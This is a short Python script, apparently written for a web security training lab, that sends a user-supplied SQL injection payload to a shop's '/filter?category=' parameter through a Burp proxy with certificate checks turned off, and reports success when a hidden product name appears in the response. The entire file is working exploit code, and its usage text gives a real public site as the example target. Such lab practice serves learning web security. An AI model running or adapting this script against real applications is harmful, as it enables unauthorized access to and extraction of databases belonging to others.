import sys

import requests

import urllib3

urllib3.disable_warnings()

# let the script go through the burp suite proxy
# for debuging purposes
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def exploit_sqli(base_url, payload_entered):
    uri = f"/filter?category={payload_entered}"
    # in this way the payload_enetered is not encoded
    r = requests.get(base_url + uri, proxies=proxies, verify=False, timeout=5)
    print(r.text)
    if "Waterproof Tea Bags" in r.text:
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        print(f'[-] Example: {sys.argv[0]} www.google.com" "1=1"')
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] Exploit successful")
    else:
        print("[-] Exploit failed")
